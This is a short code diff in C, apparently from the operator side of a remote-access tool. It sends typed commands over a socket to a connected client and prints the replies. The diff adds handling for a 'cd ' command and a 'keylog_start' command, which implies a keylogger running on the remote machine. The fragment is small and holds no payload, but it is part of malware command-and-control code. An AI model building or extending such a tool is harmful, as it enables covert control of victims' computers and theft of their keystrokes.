@@ -40,6 +40,10 @@ int main(){
         write(client_socket, buffer, sizeof(buffer));
         if(strncmp("q", buffer, 1) == 0){
             break;
+        } else if(strncmp("cd ", buffer, 3) == 0){
+            continue;
+        } else if(strncmp("keylog_start", buffer, 12) == 0){
+            continue;
         } else {
             recv(client_socket, response, sizeof(response), MSG_WAITALL);
             printf("%s", response);
